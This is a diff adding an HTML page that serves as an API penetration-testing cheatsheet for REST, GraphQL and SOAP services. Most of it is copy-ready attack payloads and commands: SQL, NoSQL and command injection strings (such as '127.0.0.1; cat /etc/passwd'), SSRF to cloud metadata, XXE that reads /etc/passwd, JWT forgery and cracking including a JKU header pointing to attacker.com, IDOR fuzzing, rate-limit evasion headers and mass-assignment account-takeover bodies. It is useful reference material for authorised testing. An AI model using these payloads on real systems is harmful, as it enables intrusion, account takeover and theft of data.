@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API Security Testing Cheatsheet | maeitsec</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg-primary:#0a0a0f;--bg-secondary:#12121a;--bg-tertiary:#1a1a24;--accent:#00ff88;--accent-dim:#00cc6a;--accent-glow:rgba(0,255,136,0.15);--text-primary:#e4e4e7;--text-secondary:#a1a1aa;--text-muted:#71717a;--border:#27272a;--red:#ff4757;--yellow:#ffa502;--blue:#3b82f6;--purple:#a855f7;--orange:#f97316}*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.6}nav{position:fixed;top:0;width:100%;padding:1rem 2rem;background:rgba(10,10,15,0.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);z-index:1000;display:flex;justify-content:space-between;align-items:center}.logo{font-family:'JetBrains Mono',monospace;font-size:1.25rem;font-weight:700;color:var(--accent);text-decoration:none}.logo span{color:var(--text-primary)}.back-link{color:var(--text-secondary);text-decoration:none;display:flex;align-items:center;gap:0.5rem;font-size:0.9rem;transition:color 0.3s}.back-link:hover{color:var(--accent)}.container{max-width:1400px;margin:0 auto;padding:5rem 2rem 3rem;display:grid;grid-template-columns:250px 1fr;gap:3rem}.sidebar{position:sticky;top:5rem;height:fit-content}.sidebar-title{font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);margin-bottom:1rem}.sidebar-nav{list-style:none}.sidebar-nav li{margin-bottom:0.25rem}.sidebar-nav a{display:block;padding:0.5rem 1rem;color:var(--text-secondary);text-decoration:none;font-size:0.9rem;border-left:2px solid transparent;transition:all 0.2s}.sidebar-nav a:hover{color:var(--accent);border-left-color:var(--accent);background:var(--accent-glow)}.content{min-width:0}.page-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}.page-header h1{font-size:2.5rem;margin-bottom:0.5rem}.page-header p{color:var(--text-secondary);font-size:1.1rem}.section{margin-bottom:3rem;scroll-margin-top:5rem}.section-title{display:flex;align-items:center;gap:0.75rem;font-size:1.5rem;margin-bottom:1.5rem;color:var(--accent)}.section-title::after{content:'';flex:1;height:1px;background:var(--border)}.code-block{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;margin-bottom:1.5rem;overflow:hidden}.code-header{display:flex;justify-content:space-between;align-items:center;padding:0.75rem 1rem;background:var(--bg-tertiary);border-bottom:1px solid var(--border)}.code-title{font-size:0.85rem;color:var(--text-secondary);font-weight:500}.code-tag{font-size:0.7rem;padding:0.2rem 0.5rem;border-radius:4px;font-family:'JetBrains Mono',monospace}.tag-rest{background:rgba(0,255,136,0.2);color:var(--accent)}.tag-graphql{background:rgba(168,85,247,0.2);color:var(--purple)}.tag-jwt{background:rgba(255,165,2,0.2);color:var(--yellow)}.tag-auth{background:rgba(255,71,87,0.2);color:var(--red)}.code-content{padding:1rem;overflow-x:auto}.code-content pre{font-family:'JetBrains Mono',monospace;font-size:0.85rem;line-height:1.6;color:var(--text-primary);white-space:pre-wrap;word-break:break-all}.code-content .comment{color:var(--text-muted)}.copy-btn{background:var(--bg-tertiary);border:1px solid var(--border);color:var(--text-secondary);padding:0.3rem 0.6rem;border-radius:4px;font-size:0.75rem;cursor:pointer;transition:all 0.2s}.copy-btn:hover{background:var(--accent);color:var(--bg-primary);border-color:var(--accent)}.info-box{background:var(--bg-secondary);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:8px;padding:1rem 1.25rem;margin-bottom:1.5rem}.info-box.warning{border-left-color:var(--yellow)}.info-box-title{font-weight:600;margin-bottom:0.5rem}.info-box p{color:var(--text-secondary);font-size:0.95rem}.table-wrapper{overflow-x:auto;margin-bottom:1.5rem}table{width:100%;border-collapse:collapse;font-size:0.9rem}th,td{padding:0.75rem 1rem;text-align:left;border:1px solid var(--border)}th{background:var(--bg-tertiary);font-weight:600;color:var(--accent)}td{background:var(--bg-secondary)}td code{background:var(--bg-tertiary);padding:0.2rem 0.4rem;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:0.8rem}footer{text-align:center;padding:2rem;border-top:1px solid var(--border);color:var(--text-muted);font-size:0.85rem}@media(max-width:900px){.container{grid-template-columns:1fr;padding-top:4rem}.sidebar{display:none}}
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="../index.html" class="logo">&lt;<span>maeitsec</span>/&gt;</a>
+        <a href="../index.html#cheatsheets" class="back-link">← Back to Cheatsheets</a>
+    </nav>
+
+    <div class="container">
+        <aside class="sidebar">
+            <div class="sidebar-title">On This Page</div>
+            <ul class="sidebar-nav">
+                <li><a href="#recon">API Reconnaissance</a></li>
+                <li><a href="#rest">REST API Testing</a></li>
+                <li><a href="#graphql">GraphQL Testing</a></li>
+                <li><a href="#auth">Authentication</a></li>
+                <li><a href="#jwt">JWT Attacks</a></li>
+                <li><a href="#bola">BOLA/IDOR</a></li>
+                <li><a href="#injection">Injection Attacks</a></li>
+                <li><a href="#rate">Rate Limiting</a></li>
+                <li><a href="#mass">Mass Assignment</a></li>
+                <li><a href="#soap">SOAP/XML</a></li>
+                <li><a href="#tools">Tools</a></li>
+            </ul>
+        </aside>
+
+        <main class="content">
+            <header class="page-header">
+                <h1>🔌 API Security Testing</h1>
+                <p>Comprehensive cheatsheet for REST, GraphQL, and SOAP API penetration testing.</p>
+            </header>
+
+            <section id="recon" class="section">
+                <h2 class="section-title">🔍 API Reconnaissance</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">API Discovery</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Common API endpoints</span>
+/api/
+/api/v1/
+/api/v2/
+/v1/
+/v2/
+/rest/
+/graphql
+/graphiql
+/swagger/
+/swagger-ui/
+/swagger.json
+/openapi.json
+/api-docs/
+/docs/
+/redoc/
+
+<span class="comment"># Fuzzing for API versions</span>
+ffuf -u https://target.com/api/vFUZZ/users -w <(seq 1 10) -mc 200,301,302
+
+<span class="comment"># Find API documentation</span>
+/swagger.json
+/swagger.yaml
+/openapi.json
+/api/swagger.json
+/api/docs
+/api/api-docs
+/.well-known/openapi.json
+
+<span class="comment"># Kiterunner - API endpoint discovery</span>
+kr scan https://target.com -w routes-large.kite
+kr brute https://target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">API Documentation Mining</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Download and analyze swagger/openapi</span>
+curl https://target.com/swagger.json | jq .
+
+<span class="comment"># Extract endpoints from swagger</span>
+cat swagger.json | jq -r '.paths | keys[]'
+
+<span class="comment"># Extract with methods</span>
+cat swagger.json | jq -r '.paths | to_entries[] | .key as $path | .value | keys[] | "\(.) \($path)"'
+
+<span class="comment"># Postman collection discovery</span>
+/postman
+/postman_collection.json
+/.postman
+
+<span class="comment"># Check for backup/debug endpoints</span>
+/api/debug
+/api/test
+/api/internal
+/api/admin
+/api/private</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="rest" class="section">
+                <h2 class="section-title">🌐 REST API Testing</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">HTTP Method Testing</span>
+                        <span class="code-tag tag-rest">REST</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Test all HTTP methods</span>
+curl -X GET https://api.target.com/users/1
+curl -X POST https://api.target.com/users -d '{"name":"test"}'
+curl -X PUT https://api.target.com/users/1 -d '{"name":"updated"}'
+curl -X PATCH https://api.target.com/users/1 -d '{"name":"patched"}'
+curl -X DELETE https://api.target.com/users/1
+curl -X OPTIONS https://api.target.com/users
+curl -X HEAD https://api.target.com/users
+curl -X TRACE https://api.target.com/users
+
+<span class="comment"># Method override headers</span>
+X-HTTP-Method-Override: PUT
+X-Method-Override: PUT
+X-HTTP-Method: PUT
+
+<span class="comment"># Content-Type testing</span>
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: application/x-www-form-urlencoded
+Content-Type: text/plain</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Parameter Pollution</span>
+                        <span class="code-tag tag-rest">REST</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># HTTP Parameter Pollution</span>
+/api/users?id=1&id=2
+/api/users?id[]=1&id[]=2
+/api/users?id=1,2
+
+<span class="comment"># JSON parameter pollution</span>
+{"user_id": 1, "user_id": 2}
+{"user": {"id": 1}, "user": {"id": 2}}
+
+<span class="comment"># Array injection</span>
+{"ids": [1, 2, 3, "admin"]}
+{"id": {"$gt": 0}}  <span class="comment"># NoSQL injection</span>
+
+<span class="comment"># Wildcard testing</span>
+/api/users/*
+/api/users/%2a
+/api/users/../admin</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="graphql" class="section">
+                <h2 class="section-title">📊 GraphQL Testing</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">GraphQL Introspection</span>
+                        <span class="code-tag tag-graphql">GraphQL</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Full introspection query</span>
+{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}
+
+<span class="comment"># Get all types</span>
+{__schema{types{name,kind,description}}}
+
+<span class="comment"># Get queries and mutations</span>
+{__schema{queryType{fields{name,description}}}}
+{__schema{mutationType{fields{name,description}}}}
+
+<span class="comment"># Get specific type details</span>
+{__type(name:"User"){name,fields{name,type{name,kind}}}}
+
+<span class="comment"># Introspection with curl</span>
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name}}}"}'</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">GraphQL Attacks</span>
+                        <span class="code-tag tag-graphql">GraphQL</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Query batching</span>
+[
+  {"query": "{ user(id: 1) { password } }"},
+  {"query": "{ user(id: 2) { password } }"}
+]
+
+<span class="comment"># Alias-based batching</span>
+{
+  u1: user(id: 1) { password }
+  u2: user(id: 2) { password }
+  u3: user(id: 3) { password }
+}
+
+<span class="comment"># SQL Injection in GraphQL</span>
+{ user(id: "1' OR '1'='1") { name email } }
+{ user(name: "admin'--") { id } }
+
+<span class="comment"># NoSQL Injection</span>
+{ user(id: {$ne: null}) { name } }
+
+<span class="comment"># DoS - Deep recursion</span>
+{ user { friends { friends { friends { friends { name }}}}}}
+
+<span class="comment"># Field suggestion exploitation</span>
+{ user { pasword } }  <span class="comment"># Check error for suggestion</span>
+
+<span class="comment"># Bypass introspection disable</span>
+<span class="comment"># Try: __Schema, __SCHEMA, ___schema</span></pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">GraphQL Tools</span>
+                        <span class="code-tag tag-graphql">GraphQL</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># graphql-voyager - visualize schema</span>
+<span class="comment"># graphiql - interactive IDE</span>
+
+<span class="comment"># InQL - Burp extension</span>
+<span class="comment"># Extracts queries from introspection</span>
+
+<span class="comment"># graphw00f - fingerprint GraphQL</span>
+python graphw00f.py -d -t https://target.com/graphql
+
+<span class="comment"># clairvoyance - get schema without introspection</span>
+clairvoyance https://target.com/graphql -o schema.json
+
+<span class="comment"># BatchQL - batch query attacks</span>
+python batchql.py -e https://target.com/graphql</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="auth" class="section">
+                <h2 class="section-title">🔐 API Authentication</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Authentication Bypass</span>
+                        <span class="code-tag tag-auth">Auth</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Remove auth headers entirely</span>
+<span class="comment"># Remove: Authorization, X-API-Key, Cookie</span>
+
+<span class="comment"># Null/empty values</span>
+Authorization: 
+Authorization: Bearer 
+Authorization: Bearer null
+X-API-Key: null
+
+<span class="comment"># Case manipulation</span>
+authorization: Bearer token
+AUTHORIZATION: Bearer token
+
+<span class="comment"># Path manipulation</span>
+/api/admin → /api/ADMIN
+/api/v1/users → /api/v1/./users
+/api/v1/users → /api/v1/users/
+/api/v1/users → /api/v1//users
+
+<span class="comment"># API versioning bypass</span>
+/api/v2/admin (403) → /api/v1/admin (200)
+
+<span class="comment"># Extension bypass</span>
+/api/admin → /api/admin.json
+/api/admin → /api/admin%00</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">API Key Testing</span>
+                        <span class="code-tag tag-auth">Auth</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Common API key locations</span>
+Header: X-API-Key, API-Key, apikey, Authorization
+Query: ?api_key=, ?apikey=, ?key=
+Body: {"api_key": "xxx"}
+
+<span class="comment"># Check for key in:</span>
+- JavaScript files
+- Mobile app decompilation
+- GitHub/GitLab repos
+- .env files
+- Config files
+
+<span class="comment"># Weak API key patterns</span>
+- Sequential: api_key_1, api_key_2
+- Predictable: base64(email), md5(username)
+- Default: test, demo, example
+
+<span class="comment"># API key privilege escalation</span>
+- Use user key on admin endpoints
+- Test cross-tenant access</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="jwt" class="section">
+                <h2 class="section-title">🎫 JWT Attacks</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">JWT Vulnerabilities</span>
+                        <span class="code-tag tag-jwt">JWT</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Decode JWT</span>
+echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx" | cut -d'.' -f2 | base64 -d
+
+<span class="comment"># None algorithm attack</span>
+<span class="comment"># Header: {"alg": "none", "typ": "JWT"}</span>
+<span class="comment"># Variations: None, NONE, nOnE</span>
+
+<span class="comment"># Algorithm confusion (RS256 → HS256)</span>
+<span class="comment"># Get public key, use as HMAC secret</span>
+
+<span class="comment"># jwt_tool commands</span>
+jwt_tool TOKEN -T                    <span class="comment"># Tamper token</span>
+jwt_tool TOKEN -C -d wordlist.txt    <span class="comment"># Crack secret</span>
+jwt_tool TOKEN -X a                  <span class="comment"># Test alg:none</span>
+jwt_tool TOKEN -X k -pk pubkey.pem   <span class="comment"># Key confusion</span>
+jwt_tool TOKEN -I -pc user -pv admin <span class="comment"># Inject claim</span>
+
+<span class="comment"># Crack with hashcat</span>
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+<span class="comment"># JKU/X5U header injection</span>
+{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
+
+<span class="comment"># KID injection</span>
+{"kid":"../../etc/passwd"}
+{"kid":"key' UNION SELECT 'secret'--"}</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="bola" class="section">
+                <h2 class="section-title">🎯 BOLA/IDOR</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Broken Object Level Authorization</span>
+                        <span class="code-tag tag-auth">BOLA</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Numeric ID manipulation</span>
+GET /api/users/1001 → /api/users/1002
+GET /api/orders/100 → /api/orders/101
+
+<span class="comment"># UUID testing</span>
+<span class="comment"># Look for UUIDs leaked in other responses</span>
+<span class="comment"># Check predictable UUID patterns</span>
+
+<span class="comment"># Encoded ID manipulation</span>
+/api/user/dXNlcjE= (base64:user1) → dXNlcjI= (user2)
+/api/user/757365723031 (hex:user01) → 757365723032 (user02)
+
+<span class="comment"># HTTP method variation</span>
+GET /api/users/2 (403) → DELETE /api/users/2 (200)
+
+<span class="comment"># Parameter location change</span>
+GET /api/users?id=2
+POST /api/users {"id": 2}
+PUT /api/users/2
+
+<span class="comment"># Autorize (Burp extension)</span>
+<span class="comment"># Automatically tests IDOR with different user sessions</span>
+
+<span class="comment"># Ffuf for IDOR</span>
+ffuf -u https://api.target.com/users/FUZZ -w <(seq 1 1000) -H "Authorization: Bearer TOKEN"</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="injection" class="section">
+                <h2 class="section-title">💉 Injection Attacks</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">API Injection Payloads</span>
+                        <span class="code-tag tag-rest">Injection</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># SQL Injection in JSON</span>
+{"username": "admin'--", "password": "x"}
+{"id": "1 OR 1=1"}
+{"search": "test' UNION SELECT * FROM users--"}
+
+<span class="comment"># NoSQL Injection (MongoDB)</span>
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$regex": "admin.*"}}
+{"$where": "this.username == 'admin'"}
+
+<span class="comment"># Command Injection</span>
+{"filename": "test; id"}
+{"cmd": "`id`"}
+{"host": "127.0.0.1; cat /etc/passwd"}
+
+<span class="comment"># SSRF via API</span>
+{"url": "http://169.254.169.254/latest/meta-data/"}
+{"webhook": "http://internal-server/admin"}
+{"avatar_url": "file:///etc/passwd"}
+
+<span class="comment"># XXE in API (if XML accepted)</span>
+Content-Type: application/xml
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="rate" class="section">
+                <h2 class="section-title">⏱️ Rate Limiting Bypass</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Rate Limit Bypass Techniques</span>
+                        <span class="code-tag tag-rest">Rate</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># IP rotation headers</span>
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+
+<span class="comment"># Rotate IPs</span>
+X-Forwarded-For: 1.1.1.1
+X-Forwarded-For: 1.1.1.2
+X-Forwarded-For: 1.1.1.3
+
+<span class="comment"># Case/encoding variations</span>
+/api/login
+/API/LOGIN
+/api/Login
+/api/login/
+/api//login
+/%61%70%69/%6c%6f%67%69%6e
+
+<span class="comment"># Add null bytes/parameters</span>
+/api/login%00
+/api/login?x=1
+/api/login#x
+
+<span class="comment"># HTTP method change</span>
+POST /api/login → PUT /api/login
+
+<span class="comment"># Array parameter bypass</span>
+{"password": "pass1"}
+{"password": ["pass1", "pass2", "pass3"]}</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="mass" class="section">
+                <h2 class="section-title">📝 Mass Assignment</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Mass Assignment / Parameter Tampering</span>
+                        <span class="code-tag tag-auth">Mass</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Add privileged parameters</span>
+POST /api/users
+{
+  "username": "attacker",
+  "password": "password",
+  "role": "admin",
+  "isAdmin": true,
+  "admin": 1,
+  "is_admin": true,
+  "user_type": "admin"
+}
+
+<span class="comment"># Account takeover parameters</span>
+{
+  "email": "attacker@evil.com",
+  "password": "newpassword",
+  "id": 1,
+  "user_id": 1
+}
+
+<span class="comment"># Credit/balance manipulation</span>
+{
+  "amount": 100,
+  "balance": 999999,
+  "credits": 999999,
+  "price": 0.01
+}
+
+<span class="comment"># Find hidden parameters</span>
+<span class="comment"># 1. Check API documentation</span>
+<span class="comment"># 2. Check response fields (try sending them back)</span>
+<span class="comment"># 3. Check related endpoints</span>
+<span class="comment"># 4. Fuzz with param-miner (Burp)</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="soap" class="section">
+                <h2 class="section-title">📄 SOAP/XML API</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">SOAP Testing</span>
+                        <span class="code-tag tag-rest">SOAP</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># WSDL discovery</span>
+?wsdl
+?WSDL
+.wsdl
+/service?wsdl
+
+<span class="comment"># XXE in SOAP</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;GetUser&gt;&amp;xxe;&lt;/GetUser&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+
+<span class="comment"># SQL Injection in SOAP</span>
+&lt;username&gt;admin' OR '1'='1&lt;/username&gt;
+
+<span class="comment"># XPATH Injection</span>
+&lt;username&gt;admin' or '1'='1&lt;/username&gt;
+&lt;username&gt;' or 1=1 or ''='&lt;/username&gt;</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tools" class="section">
+                <h2 class="section-title">🛠️ API Testing Tools</h2>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr><th>Tool</th><th>Purpose</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>Postman</td><td>API development & testing</td></tr>
+                            <tr><td>Burp Suite</td><td>Proxy & security testing</td></tr>
+                            <tr><td>Insomnia</td><td>REST/GraphQL client</td></tr>
+                            <tr><td>OWASP ZAP</td><td>Automated scanning</td></tr>
+                            <tr><td>Kiterunner</td><td>API endpoint discovery</td></tr>
+                            <tr><td>Arjun</td><td>Parameter discovery</td></tr>
+                            <tr><td>jwt_tool</td><td>JWT testing</td></tr>
+                            <tr><td>GraphQL Voyager</td><td>GraphQL schema visualization</td></tr>
+                            <tr><td>Autorize (Burp)</td><td>Authorization testing</td></tr>
+                            <tr><td>InQL (Burp)</td><td>GraphQL testing</td></tr>
+                            <tr><td>Nuclei</td><td>Template-based scanning</td></tr>
+                            <tr><td>ffuf</td><td>Fuzzing</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <p>&lt;maeitsec/&gt; | API Security Testing Cheatsheet</p>
+    </footer>
+
+    <script>
+        function copyCode(btn){const block=btn.closest('.code-block');const code=block.querySelector('pre').textContent;navigator.clipboard.writeText(code);btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',2000);}
+    </script>
+</body>
+</html>
